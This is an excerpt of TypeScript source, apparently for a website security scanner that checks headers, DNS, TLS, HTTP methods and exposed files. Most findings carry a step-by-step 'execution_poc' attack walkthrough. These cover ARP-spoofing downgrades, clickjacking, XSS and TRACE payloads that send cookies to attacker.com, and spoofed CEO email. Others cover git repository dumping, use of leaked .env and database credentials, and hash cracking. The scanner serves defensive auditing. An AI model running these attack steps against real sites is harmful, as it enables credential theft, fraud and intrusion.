      res.on("data", (chunk) => {
        if (responseBody.length < 50_000) responseBody += chunk;
      });
      res.on("end", () => {
        const headers: Record<string, string | string[] | undefined> = {};
        for (const [k, v] of Object.entries(res.headers)) headers[k.toLowerCase()] = v;
        resolve({
          statusCode: res.statusCode ?? 0,
          headers,
          body: responseBody,
          responseTimeMs: Date.now() - start,
        });
      });
    });

    req.setTimeout(timeout, () => { req.destroy(new Error("Request timed out")); });
    req.on("error", reject);
    req.write(bodyBuf);
    req.end();
  });
}

function headerStr(val: string | string[] | undefined): string | undefined {
  if (!val) return undefined;
  if (Array.isArray(val)) return val.join(", ");
  return val;
}

function checkSecurityHeaders(headers: Record<string, string | string[] | undefined>): ScanFinding[] {
  const findings: ScanFinding[] = [];

  const hsts = headerStr(headers["strict-transport-security"]);
  if (!hsts) {
    findings.push({
      id: "missing-hsts",
      category: "headers",
      title: "Missing Strict-Transport-Security (HSTS)",
      severity: "medium",
      status: "fail",
      description: "The Strict-Transport-Security header is not set. Without HSTS, browsers may connect over HTTP, exposing users to downgrade attacks.",
      recommendation: 'Set: Strict-Transport-Security: max-age=31536000; includeSubDomains; preload',
      execution_poc: `# Step 1: Confirm the header is absent
curl -sI https://TARGET_URL | grep -i strict-transport
# Expected result: (no output) — header is missing

# Step 2: Downgrade attack with SSLStrip (requires network position)
# Attacker on same LAN runs:
pip install sslstrip
sslstrip -l 8080
arpspoof -i eth0 -t VICTIM_IP GATEWAY_IP   # ARP poisoning

# Step 3: Outcome
# All HTTPS links served as HTTP to the victim
# Browser silently loads http:// version — no padlock warning
# Credentials, cookies, and tokens transmitted in plaintext
# Attacker captures them with: tcpdump -i eth0 -A port 80 | grep -i "password\\|session"

# Step 4: Verify fix
curl -sI https://TARGET_URL | grep -i strict-transport
# Expected after fix: strict-transport-security: max-age=31536000; includeSubDomains`,
    });
  } else {
    findings.push({
      id: "hsts-present",
      category: "headers",
      title: "Strict-Transport-Security (HSTS)",
      severity: "info",
      status: "pass",
      description: "HSTS header is configured.",
      detail: hsts,
    });
  }

  const xfo = headerStr(headers["x-frame-options"]);
  if (!xfo) {
    findings.push({
      id: "missing-xfo",
      category: "headers",
      title: "Missing X-Frame-Options",
      severity: "medium",
      status: "fail",
      description: "The X-Frame-Options header is missing. This may expose the site to clickjacking attacks where it is embedded in a malicious iframe.",
      recommendation: "Set: X-Frame-Options: DENY or SAMEORIGIN",
      execution_poc: `# Step 1: Confirm header is absent
curl -sI https://TARGET_URL | grep -i x-frame-options
# Expected: (no output)

# Step 2: Clickjacking PoC — save this as attack.html and open in a browser
# -----------------------------------------------------------------------
# <html><body style="background:#fff">
#   <h2>You have won a prize! Click the button:</h2>
#   <!-- Invisible iframe overlaid on top of the fake button -->
#   <iframe src="https://TARGET_URL/account/settings"
#           style="opacity:0.01; position:absolute; top:60px; left:0;
#                  width:800px; height:400px; z-index:99">
#   </iframe>
#   <button style="position:absolute; top:100px; left:150px;
#                  padding:20px; font-size:18px; z-index:1">
#     CLAIM PRIZE
#   </button>
# </body></html>
# -----------------------------------------------------------------------

# Step 3: Outcome
# Victim thinks they are clicking "Claim Prize"
# They are actually clicking on a button inside the TARGET_URL page
# (e.g. "Confirm transfer", "Delete account", "Approve payment")
# Their authenticated session performs the action with no awareness

# Step 4: Advanced — UI redress with CSS position manipulation
# Use browser DevTools to measure exact pixel coordinates of target button
# then position the iframe to align it precisely`,
    });
  } else {
    findings.push({
      id: "xfo-present",
      category: "headers",
      title: "X-Frame-Options",
      severity: "info",
      status: "pass",
      description: "Clickjacking protection header is set.",
      detail: xfo,
    });
  }

  const csp = headerStr(headers["content-security-policy"]);
  if (!csp) {
    findings.push({
      id: "missing-csp",
      category: "headers",
      title: "Missing Content-Security-Policy",
      severity: "high",
      status: "fail",
      description: "No Content-Security-Policy header found. CSP is the primary defense against XSS (Cross-Site Scripting) attacks.",
      recommendation: "Implement a strict CSP. Start with: Content-Security-Policy: default-src 'self'",
      execution_poc: `# Step 1: Confirm header is absent
curl -sI https://TARGET_URL | grep -i content-security-policy
# Expected: (no output)

# Step 2: Without CSP, any injected script executes freely in the browser
# If the site also has an XSS vulnerability (see Reflected XSS finding):
# Inject this payload into a vulnerable input field or URL parameter:
#
# https://TARGET_URL/search?q=<script>
#   fetch('https://attacker.com/exfil?d='+btoa(document.cookie))
# </script>

# Step 3: Data exfiltration outcome
# Attacker receives the victim's cookies at https://attacker.com/exfil
# attacker.com access log shows: GET /exfil?d=c2Vzc2lvbj1hYmMxMjM=
# base64 decode: session=abc123

# Step 4: Without CSP, attacker can also load remote scripts
# <script src="https://attacker.com/keylogger.js"></script>
# This captures every keystroke — passwords, credit card numbers, etc.

# Step 5: Burp Suite test
# Proxy > Intercept > send request > Repeater
# Check Response Headers tab — CSP should appear there if set`,
    });
  } else {
    const unsafeInline = csp.includes("'unsafe-inline'");
    const unsafeEval = csp.includes("'unsafe-eval'");
    if (unsafeInline || unsafeEval) {
      findings.push({
        id: "weak-csp",
        category: "headers",
        title: "Weak Content-Security-Policy",
        severity: "medium",
        status: "warning",
        description: `CSP is present but uses ${[unsafeInline && "'unsafe-inline'", unsafeEval && "'unsafe-eval'"].filter(Boolean).join(" and ")}, which weakens XSS protection.`,
        detail: csp.slice(0, 200),
        recommendation: "Remove 'unsafe-inline' and 'unsafe-eval' directives and use nonces or hashes instead.",
      });
    } else {
      findings.push({
        id: "csp-present",
        category: "headers",
        title: "Content-Security-Policy",
        severity: "info",
        status: "pass",
        description: "CSP header is configured.",
        detail: csp.slice(0, 200),
      });
    }
  }

  const xcto = headerStr(headers["x-content-type-options"]);
  if (!xcto || xcto.toLowerCase() !== "nosniff") {
    findings.push({
      id: "missing-xcto",
      category: "headers",
      title: "Missing X-Content-Type-Options",
      severity: "low",
      status: "fail",
      description: "X-Content-Type-Options: nosniff is not set. Without it, browsers may MIME-sniff responses away from declared content types.",
      recommendation: "Set: X-Content-Type-Options: nosniff",
      execution_poc: `# Step 1: Confirm header is absent
curl -sI https://TARGET_URL | grep -i x-content-type-options
# Expected: (no output)

# Step 2: MIME-sniffing attack — upload a polyglot file
# Create a file that is valid JPEG but contains JavaScript:
# (binary JPEG header) + <script>alert(document.domain)</script>
# Upload to profile picture endpoint, get a public URL like:
# https://TARGET_URL/uploads/photo.jpg

# Step 3: Serve the JPEG URL inside a <script> tag
# <script src="https://TARGET_URL/uploads/photo.jpg"></script>
# Without nosniff, IE/old Edge sniffs the content as JavaScript and EXECUTES it

# Step 4: Verify with curl
curl -sI https://TARGET_URL/uploads/photo.jpg | grep -i content-type
# Content-Type: image/jpeg  (but browser may still sniff and execute JS)

# Modern Chrome/Firefox are largely resistant, but IE11 and some
# enterprise browsers are still vulnerable to this attack vector`,
    });
  } else {
    findings.push({
      id: "xcto-present",
      category: "headers",
      title: "X-Content-Type-Options",
      severity: "info",
      status: "pass",
      description: "MIME-type sniffing protection is enabled.",
    });
  }

  const rp = headerStr(headers["referrer-policy"]);
  if (!rp) {
    findings.push({
      id: "missing-rp",
      category: "headers",
      title: "Missing Referrer-Policy",
      severity: "low",
      status: "warning",
      description: "No Referrer-Policy header set. Without it, the browser's default may leak full URLs in the Referer header to third parties.",
      recommendation: "Set: Referrer-Policy: strict-origin-when-cross-origin",
      execution_poc: `# Step 1: Confirm header is absent
curl -sI https://TARGET_URL | grep -i referrer-policy
# Expected: (no output)

# Step 2: Observe Referer leakage using Burp Suite
# Open Burp > Proxy > Intercept
# Visit: https://TARGET_URL/account/reset-password?token=SECRET_TOKEN_ABC123
# Click any external link on that page (e.g. a social media link)
# In Burp, intercept the outgoing request — check the Referer header:
# Referer: https://TARGET_URL/account/reset-password?token=SECRET_TOKEN_ABC123
# The full URL including the password-reset token is leaked to the third party!

# Step 3: With curl, simulate a cross-origin request with Referer
curl -sI https://third-party.com/some-resource \
     -H "Referer: https://TARGET_URL/private-page?sessionid=xyz"

# Step 4: Outcome
# Password reset tokens, session identifiers, and private page paths
# can be harvested from server access logs of any third-party resource
# (analytics scripts, CDNs, embedded fonts, tracking pixels)`,
    });
  } else {
    findings.push({
      id: "rp-present",
      category: "headers",
      title: "Referrer-Policy",
      severity: "info",
      status: "pass",
      description: "Referrer-Policy is configured.",
      detail: rp,
    });
  }

  const pp = headerStr(headers["permissions-policy"]) || headerStr(headers["feature-policy"]);
  if (!pp) {
    findings.push({
      id: "missing-pp",
      category: "headers",
      title: "Missing Permissions-Policy",
      severity: "info",
      status: "info",
      description: "Permissions-Policy (formerly Feature-Policy) header is not set. This header lets you control browser feature access (camera, microphone, geolocation).",
      recommendation: "Consider setting: Permissions-Policy: camera=(), microphone=(), geolocation=()",
    });
  } else {
    findings.push({
      id: "pp-present",
      category: "headers",
      title: "Permissions-Policy",
      severity: "info",
      status: "pass",
      description: "Permissions-Policy header is configured.",
      detail: pp.slice(0, 150),
    });
  }

  return findings;
}

function checkServerInfo(headers: Record<string, string | string[] | undefined>): ScanFinding[] {
  const findings: ScanFinding[] = [];

  const server = headerStr(headers["server"]);
  if (server) {
    const exposesVersion = /[\d.]{2,}/.test(server) || /nginx\/|apache\/|iis\/|express\//i.test(server);
    findings.push({
      id: "server-header",
      category: "server_info",
      title: exposesVersion ? "Server Version Disclosure" : "Server Header Present",
      severity: exposesVersion ? "low" : "info",
      status: exposesVersion ? "warning" : "info",
      description: exposesVersion
        ? "The Server header reveals the web server software and version. Attackers use this to identify known vulnerabilities for that version."
        : "The Server header is present but does not disclose version information.",
      detail: server,
      recommendation: exposesVersion
        ? "Configure your web server to remove or obfuscate the Server header. Remove version information."
        : undefined,
      execution_poc: exposesVersion ? `# Step 1: Extract server banner
curl -sI https://TARGET_URL | grep -i server
# Example output: Server: nginx/1.18.0

# Step 2: Search for CVEs against the identified version
searchsploit nginx 1.18
# or visit: https://www.cvedetails.com/version-list/10048/12926/1/Nginx-Nginx.html

# Step 3: Check NVD for known vulnerabilities
curl -s "https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch=nginx+1.18" \
     | python3 -m json.tool | grep -i "cveid\\|description"

# Step 4: Outcome
# Attacker identifies an unpatched CVE (e.g. CVE-2021-23017 — nginx DNSSEC buffer overflow)
# Downloads a public exploit: searchsploit -m 49812
# Executes against the target with the known version` : undefined,
    });
  } else {
    findings.push({
      id: "server-hidden",
      category: "server_info",
      title: "Server Header Hidden",
      severity: "info",
      status: "pass",
      description: "Server header is not present, preventing software/version disclosure.",
    });
  }

  const xpow = headerStr(headers["x-powered-by"]);
  if (xpow) {
    findings.push({
      id: "x-powered-by",
      category: "server_info",
      title: "X-Powered-By Header Exposed",
      severity: "low",
      status: "warning",
      description: "The X-Powered-By header reveals the server-side technology (e.g., PHP, Express, ASP.NET), helping attackers target known vulnerabilities.",
      detail: xpow,
      recommendation: "Remove the X-Powered-By header. In Express: app.disable('x-powered-by'). In PHP: expose_php = Off",
      execution_poc: `# Step 1: Confirm the header is present
curl -sI https://TARGET_URL | grep -i x-powered-by
# Example output: X-Powered-By: PHP/7.2.0

# Step 2: Enumerate CVEs for the disclosed technology
searchsploit php 7.2
# or: https://www.cvedetails.com/vulnerability-list/vendor_id-74/product_id-128/version_id-232288/PHP-PHP-7.2.0.html

# Step 3: For outdated PHP — attempt type-juggling or deserialization exploits
# PHP 7.2 is EOL (end-of-life) — no security patches since Nov 2020
# Known critical: CVE-2019-11043 (nginx + php-fpm RCE)
curl -v "https://TARGET_URL/index.php?a=AAAAAA....(250+ chars)"
# Returns 502? May be vulnerable to memory corruption

# Step 4: For Express disclosure
# X-Powered-By: Express → indicates Node.js
# Probe for common Node.js vulnerabilities or prototype pollution`,
    });
  } else {
    findings.push({
      id: "x-powered-by-hidden",
      category: "server_info",
      title: "X-Powered-By Hidden",
      severity: "info",
      status: "pass",
      description: "X-Powered-By header is not present.",
    });
  }

  const via = headerStr(headers["via"]);
  if (via) {
    findings.push({
      id: "via-header",
      category: "server_info",
      title: "Via Header Exposes Proxy Info",
      severity: "info",
      status: "info",
      description: "The Via header is present, indicating a proxy or load balancer and its version.",
      detail: via,
    });
  }

  return findings;
}

async function checkDns(hostname: string): Promise<ScanFinding[]> {
  const findings: ScanFinding[] = [];

  try {
    const addresses = await dns.resolve4(hostname);
    findings.push({
      id: "dns-a-records",
      category: "dns",
      title: "DNS A Records",
      severity: "info",
      status: "info",
      description: `Found ${addresses.length} IPv4 address(es) for this hostname.`,
      detail: addresses.join(", "),
    });
  } catch {
    findings.push({
      id: "dns-no-a",
      category: "dns",
      title: "No DNS A Records Found",
      severity: "high",
      status: "fail",
      description: "Could not resolve IPv4 address for this hostname. The domain may not exist or DNS is misconfigured.",
    });
  }

  try {
    const mx = await dns.resolveMx(hostname);
    if (mx.length > 0) {
      findings.push({
        id: "dns-mx",
        category: "dns",
        title: "Mail Servers (MX Records)",
        severity: "info",
        status: "info",
        description: `Found ${mx.length} MX record(s). Email infrastructure is publicly discoverable.`,
        detail: mx.map((r) => `${r.exchange} (priority: ${r.priority})`).join(", "),
      });
    }
  } catch {}

  try {
    const ns = await dns.resolveNs(hostname);
    if (ns.length > 0) {
      findings.push({
        id: "dns-ns",
        category: "dns",
        title: "Nameservers (NS Records)",
        severity: "info",
        status: "info",
        description: `Domain uses ${ns.length} nameserver(s). Nameserver software/provider is publicly discoverable.`,
        detail: ns.join(", "),
      });
    }
  } catch {}

  try {
    const txt = await dns.resolveTxt(hostname);
    const hasSPF = txt.some((r) => r.join("").toLowerCase().startsWith("v=spf1"));
    const hasDMARC = txt.some((r) => r.join("").toLowerCase().includes("v=dmarc1"));
    if (hasSPF) {
      findings.push({
        id: "spf-present",
        category: "dns",
        title: "SPF Record Present",
        severity: "info",
        status: "pass",
        description: "An SPF (Sender Policy Framework) record exists, helping prevent email spoofing.",
        detail: txt.find((r) => r.join("").toLowerCase().startsWith("v=spf1"))?.join(""),
      });
    } else {
      findings.push({
        id: "spf-missing",
        category: "dns",
        title: "Missing SPF Record",
        severity: "medium",
        status: "warning",
        description: "No SPF record found. Without SPF, malicious actors can send email impersonating your domain.",
        recommendation: "Add a TXT record: v=spf1 include:your-mail-provider.com ~all",
        execution_poc: `# Step 1: Confirm SPF is absent
dig TXT TARGET_DOMAIN | grep spf
# Expected: (no output) — no SPF record

# Step 2: Send a spoofed email using swaks (SMTP Swiss Army Knife)
# Install: sudo apt install swaks
swaks --to victim@company.com \\
      --from ceo@TARGET_DOMAIN \\
      --server mail.attacker.com \\
      --header "Subject: Urgent: Wire transfer required" \\
      --body "Hi, please process this payment immediately."

# Step 3: Outcome
# Email arrives appearing to be from ceo@TARGET_DOMAIN
# Many mail clients show only the display name, hiding the actual server
# Recipient is deceived into acting on a fraudulent email (phishing/BEC)

# Step 4: Verify via MXToolbox
# https://mxtoolbox.com/spf.aspx?domain=TARGET_DOMAIN
# Result will confirm: "SPF Record Not Found"`,
      });
    }

    if (!hasDMARC) {
      findings.push({
        id: "dmarc-missing",
        category: "dns",
        title: "Missing DMARC Record",
        severity: "medium",
        status: "warning",
        description: "No DMARC policy found. DMARC protects against email spoofing by specifying what to do with unauthenticated emails.",
        recommendation: "Add a TXT record on _dmarc.yourdomain.com: v=DMARC1; p=quarantine; rua=mailto:dmarc@yourdomain.com",
        execution_poc: `# Step 1: Confirm DMARC is absent
dig TXT _dmarc.TARGET_DOMAIN
# Expected: (no output)

# Step 2: Without DMARC, receiving mail servers have no policy to enforce
# Even if SPF exists, a missing DMARC means alignment is not enforced
# Combine with SPF spoofing attack (see Missing SPF finding)

# Step 3: Check alignment failure with dmarcian or mail-tester
# Send a test email and check: https://www.mail-tester.com/
# Score will show "DMARC policy not enabled"

# Step 4: Impact — Business Email Compromise (BEC)
# Attacker spoofs billing@TARGET_DOMAIN to accounts payable team
# No SPF+DMARC = email passes spam filters in many configurations
# FBI IC3 report: BEC scams cost $2.7B+ annually`,
      });
    } else {
      findings.push({
        id: "dmarc-present",
        category: "dns",
        title: "DMARC Policy Present",
        severity: "info",
        status: "pass",
        description: "DMARC policy is configured, protecting against email spoofing.",
      });
    }
  } catch {}

  return findings;
}

async function checkSsl(url: string, fetchResult: FetchResult): Promise<ScanFinding[]> {
  const findings: ScanFinding[] = [];
  const parsed = new URL(url);

  if (parsed.protocol === "http:") {
    findings.push({
      id: "no-https",
      category: "ssl",
      title: "Site Not Using HTTPS",
      severity: "critical",
      status: "fail",
      description: "The target URL uses plain HTTP, meaning all data is transmitted unencrypted. Credentials, session cookies, and personal data are exposed.",
      recommendation: "Migrate to HTTPS. Obtain a free TLS certificate from Let's Encrypt.",
      execution_poc: `# Step 1: Confirm the site runs HTTP only
curl -sI http://TARGET_URL | head -5
# Response will not redirect to https://

# Step 2: Passive traffic interception (same LAN / coffee shop wifi)
# Attacker runs Wireshark or tcpdump:
tcpdump -i eth0 -A host TARGET_IP and port 80 | grep -i "password\\|token\\|session\\|cookie"

# Step 3: Active man-in-the-middle with mitmproxy
mitmproxy --mode transparent --listen-port 8080
# Route victim's traffic through attacker machine (ARP poisoning):
arpspoof -i eth0 -t VICTIM_IP GATEWAY_IP
# mitmproxy captures ALL plaintext HTTP traffic including credentials

# Step 4: Example captured credential
# POST /login HTTP/1.1
# username=admin&password=hunter2
# Session cookie in plaintext in subsequent requests

# Step 5: Fix — obtain free certificate
certbot --nginx -d TARGET_DOMAIN
# Then redirect all HTTP to HTTPS:
# return 301 https://$host$request_uri;`,
    });
    return findings;
  }

  if (fetchResult.sslValid !== undefined) {
    if (fetchResult.sslValid) {
      findings.push({
        id: "ssl-valid",
        category: "ssl",
        title: "Valid SSL/TLS Certificate",
        severity: "info",
        status: "pass",
        description: "The SSL/TLS certificate is valid and not expired.",
        detail: fetchResult.sslExpiry ? `Expires: ${fetchResult.sslExpiry}` : undefined,
      });

      if (fetchResult.sslExpiry) {
        const expiry = new Date(fetchResult.sslExpiry);
        const daysLeft = Math.floor((expiry.getTime() - Date.now()) / (1000 * 60 * 60 * 24));
        if (daysLeft < 30) {
          findings.push({
            id: "ssl-expiry-soon",
            category: "ssl",
            title: "SSL Certificate Expiring Soon",
            severity: daysLeft < 7 ? "critical" : "high",
            status: "warning",
            description: `SSL certificate expires in ${daysLeft} day(s). If it expires, browsers will show security warnings and block access.`,
            detail: `Expiry: ${fetchResult.sslExpiry}`,
            recommendation: "Renew the certificate immediately. Consider enabling auto-renewal.",
          });
        }
      }
    } else {
      findings.push({
        id: "ssl-invalid",
        category: "ssl",
        title: "Invalid or Expired SSL Certificate",
        severity: "critical",
        status: "fail",
        description: "The SSL certificate is invalid or expired. Browsers will block access and users will see security warnings.",
        detail: fetchResult.sslExpiry ? `Certificate expiry: ${fetchResult.sslExpiry}` : undefined,
        recommendation: "Renew your SSL certificate immediately.",
        execution_poc: `# Step 1: Inspect the certificate details
openssl s_client -connect TARGET_DOMAIN:443 -servername TARGET_DOMAIN 2>/dev/null \\
  | openssl x509 -noout -dates -subject -issuer
# Output shows: notAfter=<past date> → certificate is expired

# Step 2: Confirm with curl
curl -v https://TARGET_URL 2>&1 | grep -i "certificate\\|SSL\\|expired"
# curl: (60) SSL certificate problem: certificate has expired

# Step 3: Impact on users
# Chrome/Firefox shows: "Your connection is not private" (ERR_CERT_DATE_INVALID)
# Users who click through "Advanced > Proceed" are susceptible to MITM
# Attacker can present their own certificate (since trust is already broken)

# Step 4: Attacker performs SSL stripping
# Since users click through the warning, the connection is downgraded to HTTP
# Attacker intercepts with mitmproxy and captures credentials in plaintext

# Step 5: Renew immediately
certbot renew --force-renewal
# For Let's Encrypt auto-renewal: systemctl enable certbot.timer`,
      });
    }
  }

  return findings;
}

async function checkContentDiscovery(baseUrl: string): Promise<ScanFinding[]> {
  const findings: ScanFinding[] = [];
  const parsed = new URL(baseUrl);
  const base = `${parsed.protocol}//${parsed.host}`;

  const paths = [
    { path: "/robots.txt", name: "robots.txt" },
    { path: "/sitemap.xml", name: "sitemap.xml" },
    { path: "/.well-known/security.txt", name: "security.txt" },
  ];

  for (const { path, name } of paths) {
    try {
      const result = await fetchUrl(base + path, "GET", 5000);
      if (result.statusCode === 200) {
        if (name === "robots.txt") {
          const disallowed = (result.body.match(/Disallow:.+/g) || []).map((l) => l.replace("Disallow:", "").trim()).filter(Boolean);
          findings.push({
            id: "robots-txt",
            category: "content_discovery",
            title: "robots.txt Found",
            severity: "info",
            status: "info",
            description: `robots.txt is accessible and lists ${disallowed.length} disallowed path(s). This file reveals directory structure to search engines and attackers.`,
            detail: disallowed.length ? `Disallowed paths: ${disallowed.slice(0, 5).join(", ")}` : undefined,
          });
        } else if (name === "sitemap.xml") {
          findings.push({
            id: "sitemap-xml",
            category: "content_discovery",
            title: "sitemap.xml Found",
            severity: "info",
            status: "info",
            description: "sitemap.xml is publicly accessible, exposing the full URL structure of the website.",
          });
        } else if (name === "security.txt") {
          findings.push({
            id: "security-txt",
            category: "content_discovery",
            title: "security.txt Present",
            severity: "info",
            status: "pass",
            description: "A security.txt file is present, providing contact information for security researchers to report vulnerabilities.",
          });
        }
      } else if (name === "security.txt") {
        findings.push({
          id: "security-txt-missing",
          category: "content_discovery",
          title: "No security.txt Found",
          severity: "info",
          status: "info",
          description: "No security.txt file found. This optional file (RFC 9116) provides a standard way for security researchers to report vulnerabilities.",
          recommendation: "Create /.well-known/security.txt with contact and policy information.",
        });
      }
    } catch {}
  }

  return findings;
}

async function checkHttpMethods(baseUrl: string): Promise<ScanFinding[]> {
  const findings: ScanFinding[] = [];

  const dangerousMethods = ["TRACE", "OPTIONS"];

  for (const method of dangerousMethods) {
    try {
      const result = await fetchUrl(baseUrl, method, 5000);
      if (method === "TRACE" && result.statusCode === 200) {
        findings.push({
          id: "trace-enabled",
          category: "http_methods",
          title: "HTTP TRACE Method Enabled",
          severity: "medium",
          status: "fail",
          description: "The TRACE method is enabled. It can be used in Cross-Site Tracing (XST) attacks to steal cookies, bypassing HttpOnly protection.",
          recommendation: "Disable the TRACE method on your web server.",
          execution_poc: `# Step 1: Confirm TRACE is enabled
curl -X TRACE https://TARGET_URL -v 2>&1 | grep -A 20 "< HTTP"
# Response body will echo back the full request — including all headers!

# Step 2: Cross-Site Tracing (XST) attack
# Even HttpOnly cookies can be stolen if TRACE is enabled + XSS exists:
# Inject this script via XSS vulnerability:
#
# <script>
#   var xhr = new XMLHttpRequest();
#   xhr.open('TRACE', 'https://TARGET_URL/', false);
#   xhr.send('');
#   // Response body contains all request headers including HttpOnly cookies
#   fetch('https://attacker.com/steal?d=' + btoa(xhr.responseText));
# </script>

# Step 3: Outcome
# The TRACE response echoes: Cookie: session=ABC123; HttpOnly
# This bypasses HttpOnly — the flag prevents JS document.cookie access
# but TRACE reflection leaks it through the response body

# Step 4: Disable in nginx
# server { ... }
# Add inside server block: if ($request_method = TRACE) { return 405; }
# Apache: TraceEnable Off`,
        });
      } else if (method === "OPTIONS") {
        const allow = headerStr(result.headers["allow"]) || headerStr(result.headers["public"]);
        if (allow) {
          const allowedMethods = allow.toUpperCase();
          const hasDelete = allowedMethods.includes("DELETE");
          const hasPut = allowedMethods.includes("PUT");
          findings.push({
            id: "options-methods",
            category: "http_methods",
            title: "HTTP Methods via OPTIONS",
            severity: hasDelete || hasPut ? "low" : "info",
            status: hasDelete || hasPut ? "warning" : "info",
            description: `Server advertises the following HTTP methods: ${allow}`,
            detail: allow,
            recommendation: hasDelete || hasPut
              ? "Verify that DELETE and PUT methods are intentionally exposed and protected by authentication."
              : undefined,
          });
        }
      }
    } catch {}
  }

  if (!findings.some((f) => f.id === "trace-enabled")) {
    findings.push({
      id: "trace-disabled",
      category: "http_methods",
      title: "HTTP TRACE Method Disabled",
      severity: "info",
      status: "pass",
      description: "TRACE method is not enabled, preventing Cross-Site Tracing attacks.",
    });
  }

  return findings;
}

// ── Sensitive Files ──────────────────────────────────────────────────────────

const SENSITIVE_PATHS: Array<{ path: string; label: string; severity: ScanFinding["severity"]; why: string }> = [
  { path: "/.git/HEAD",         label: ".git/HEAD",       severity: "critical", why: "Git repository metadata is publicly accessible, potentially exposing source code history, credentials, and internal logic." },
  { path: "/.git/config",       label: ".git/config",     severity: "critical", why: "Git config can reveal remote URLs, author details, and repository structure." },
  { path: "/.env",              label: ".env",            severity: "critical", why: "Environment file may contain database credentials, API keys, and other secrets in plain text." },
  { path: "/.env.local",        label: ".env.local",      severity: "critical", why: "Local environment override file may contain secrets not intended for production." },
  { path: "/.env.production",   label: ".env.production", severity: "critical", why: "Production environment file may expose database credentials and API keys." },
  { path: "/wp-config.php",     label: "wp-config.php",   severity: "critical", why: "WordPress configuration file contains database host, name, username, and password." },
  { path: "/.htpasswd",         label: ".htpasswd",       severity: "high",     why: "Exposes hashed credentials for HTTP Basic Authentication — attackers can attempt offline dictionary attacks." },
  { path: "/.htaccess",         label: ".htaccess",       severity: "medium",   why: "Reveals server configuration rules such as rewrites, redirects, access restrictions, and custom error pages." },
  { path: "/web.config",        label: "web.config",      severity: "high",     why: "IIS configuration file can contain connection strings, authentication settings, and custom error details." },
  { path: "/phpinfo.php",       label: "phpinfo.php",     severity: "high",     why: "PHP info page exposes server configuration, loaded modules, environment variables, and PHP version." },
  { path: "/server-status",     label: "server-status",   severity: "medium",   why: "Apache server-status page discloses active requests, clients, and server uptime." },
  { path: "/server-info",       label: "server-info",     severity: "medium",   why: "Apache server-info page reveals installed modules and configuration directives." },
  { path: "/config.php",        label: "config.php",      severity: "high",     why: "Application config file may expose database credentials and internal settings." },
  { path: "/config.yml",        label: "config.yml",      severity: "high",     why: "YAML config file may contain secrets, database credentials, or service API keys." },
  { path: "/config.json",       label: "config.json",     severity: "medium",   why: "JSON configuration file may reveal application settings and internal structure." },
  { path: "/backup.sql",        label: "backup.sql",      severity: "critical", why: "A database dump file is directly accessible — contains all table structure and data." },
  { path: "/dump.sql",          label: "dump.sql",        severity: "critical", why: "A database dump file is directly accessible — contains all table structure and data." },
  { path: "/database.sql",      label: "database.sql",    severity: "critical", why: "A database export file is directly accessible." },
  { path: "/.DS_Store",         label: ".DS_Store",       severity: "low",      why: "macOS metadata file reveals directory structure and file names on the server." },
  { path: "/crossdomain.xml",   label: "crossdomain.xml", severity: "low",      why: "Flash cross-domain policy file — if misconfigured (allow-access-from domain='*'), allows any Flash app to read responses." },
  { path: "/elmah.axd",         label: "elmah.axd",       severity: "high",     why: "ASP.NET error log viewer is publicly accessible, exposing stack traces, server paths, and potential credentials." },
  { path: "/trace.axd",         label: "trace.axd",       severity: "medium",   why: "ASP.NET trace viewer exposes request/response details and internal data flows." },
];

function getSensitiveFilePoc(path: string, label: string): string {
  if (path.startsWith("/.git")) {
    return `# Step 1: Confirm the git repo is exposed
curl -s https://TARGET_URL/.git/HEAD
# Expected output: ref: refs/heads/main   ← git repo metadata is public!

# Step 2: Dump the full repository using git-dumper
pip install git-dumper
git-dumper https://TARGET_URL/.git/ ./stolen-repo

# Step 3: Inspect the stolen source code
cd stolen-repo
git log --oneline    # commit history
grep -r "password\\|secret\\|api_key\\|token" .   # hunt for credentials
cat .env             # environment variables often committed by accident

# Step 4: Outcome
# Full source code, commit history, database credentials, API keys, and
# internal architecture details are now in the attacker's hands
# Use discovered credentials to access databases, cloud accounts, etc.`;
  }
  if (path === "/.env" || path === "/.env.local" || path === "/.env.production") {
    return `# Step 1: Fetch the file directly
curl -s https://TARGET_URL${path}
# Expected output:
# DB_HOST=db.internal.com
# DB_USER=appuser
# DB_PASSWORD=supersecret123
# STRIPE_SECRET_KEY=sk_live_...
# JWT_SECRET=...

# Step 2: Use the leaked credentials
# Database: psql -h db.internal.com -U appuser -d production
# API keys: curl -H "Authorization: Bearer JWT_SECRET" https://TARGET_URL/api/admin
# Stripe: curl https://api.stripe.com/v1/charges -u sk_live_...:

# Step 3: Outcome
# Complete database access, payment processing capability, and
# admin API access — full compromise of all backend systems`;
  }
  if (path === "/wp-config.php") {
    return `# Step 1: Confirm file is accessible
curl -s https://TARGET_URL/wp-config.php | grep -i "DB_\\|table_prefix"
# Output: define('DB_NAME', 'wordpress'); define('DB_PASSWORD', 'secretpass');

# Step 2: Connect directly to the database
mysql -h DB_HOST -u DB_USER -p DB_PASSWORD DB_NAME
SELECT user_login, user_pass FROM wp_users;

# Step 3: Crack the WordPress hash
hashcat -m 400 hashes.txt /usr/share/wordlists/rockyou.txt
# WordPress uses phpass — hashcat mode 400

# Step 4: Outcome — full WordPress admin access and database control`;
  }
  if (path === "/phpinfo.php") {
    return `# Step 1: Confirm file is accessible
curl -s https://TARGET_URL/phpinfo.php | grep -i "PHP Version\\|SERVER_ADDR\\|DOCUMENT_ROOT"

# Step 2: Extract sensitive information from the output
# - PHP version → search CVEs: https://www.cvedetails.com/product/128/PHP-PHP.html
# - DOCUMENT_ROOT → reveals server filesystem path (useful for LFI attacks)
# - Database connection info in environment variables section
# - Loaded extensions → identify attack surface (XML, SOAP, etc.)
# - disable_functions → know what is blocked on this PHP install

# Step 3: Use DOCUMENT_ROOT for Local File Inclusion (LFI)
# If another LFI vulnerability exists, use the path to traverse:
# https://TARGET_URL/page.php?file=../../../../etc/passwd`;
  }
  if (path === "/.htpasswd") {
    return `# Step 1: Fetch the credential file
curl -s https://TARGET_URL/.htpasswd
# Output: admin:$apr1$xyz$hashedpassword

# Step 2: Crack the hash with hashcat
hashcat -m 1600 htpasswd_hashes.txt /usr/share/wordlists/rockyou.txt
# Mode 1600 = Apache $apr1$ MD5 hash

# Step 3: Authenticate with cracked credentials
curl -u admin:cracked_password https://TARGET_URL/protected-area/

# Step 4: Outcome — access to HTTP Basic Auth protected resources`;
  }
  if (path.endsWith(".sql")) {
    return `# Step 1: Download the database dump
curl -s https://TARGET_URL${path} -o stolen_db.sql
wc -l stolen_db.sql   # shows how many rows/records were exposed

# Step 2: Import and query locally
mysql -u root -p < stolen_db.sql
